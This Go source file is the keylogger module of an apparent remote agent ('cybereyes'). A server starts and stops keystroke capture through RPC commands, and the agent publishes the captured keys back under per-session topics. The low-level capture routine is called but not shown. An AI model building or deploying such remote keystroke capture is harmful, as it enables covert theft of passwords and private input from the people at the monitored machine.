// Package keylog captura teclas via GetAsyncKeyState (Windows) e publica em
// <agent_id>.keylog.<session_id>. O servidor manda keylog_start e keylog_stop por publish.
package keylog

import (
	"context"
	"log/slog"
	"sync"
	"time"

	"github.com/pauloacruz/cybereyes/agent/internal/env"
	"github.com/pauloacruz/cybereyes/agent/internal/rpc"
)

type publisher interface {
	Publish(suffix string, body any) error
}

type endFrame struct {
	Done bool `json:"done"`
}

type keyFrame struct {
	Keys string `json:"keys"`
	Ts   int64  `json:"ts"`
}

type Manager struct {
	pub publisher
	log *slog.Logger

	mu       sync.Mutex
	sessions map[string]context.CancelFunc
}

func NewManager(pub publisher, log *slog.Logger) *Manager {
	return &Manager{
		pub:      pub,
		log:      log,
		sessions: map[string]context.CancelFunc{},
	}
}

func Register(e *env.Env) error {
	m := NewManager(e.Pub, e.Log)
	m.register(e.Reg)
	e.Go("keylog-shutdown", func(ctx context.Context) {
		<-ctx.Done()
		m.StopAll()
	})
	return nil
}

func (m *Manager) register(reg *rpc.Registry) {
	reg.HandleTimeout("keylog_start", 10*time.Second, func(_ context.Context, req rpc.Request) any {
		p := req.Payload()
		m.Start(p.Str("session_id"))
		return nil
	})
	reg.HandleTimeout("keylog_stop", 10*time.Second, func(_ context.Context, req rpc.Request) any {
		m.Stop(req.Payload().Str("session_id"))
		return nil
	})
}

func (m *Manager) Start(id string) {
	if id == "" {
		return
	}
	m.mu.Lock()
	if _, ok := m.sessions[id]; ok {
		m.mu.Unlock()
		return
	}
	ctx, cancel := context.WithCancel(context.Background())
	m.sessions[id] = cancel
	m.mu.Unlock()

	m.log.Info("keylog iniciado", "session", id)
	go m.capture(ctx, id)
}

func (m *Manager) Stop(id string) {
	m.mu.Lock()
	cancel, ok := m.sessions[id]
	if ok {
		delete(m.sessions, id)
	}
	m.mu.Unlock()
	if ok {
		cancel()
		m.log.Info("keylog encerrado", "session", id)
	}
}

func (m *Manager) StopAll() {
	m.mu.Lock()
	for id, cancel := range m.sessions {
		cancel()
		delete(m.sessions, id)
	}
	m.mu.Unlock()
}

func (m *Manager) capture(ctx context.Context, id string) {
	defer func() {
		m.mu.Lock()
		delete(m.sessions, id)
		m.mu.Unlock()
		_ = m.pub.Publish("keylog."+id, endFrame{Done: true})
	}()

	spawnCaptureInUserSession(ctx, id, m.pub, m.log)
}
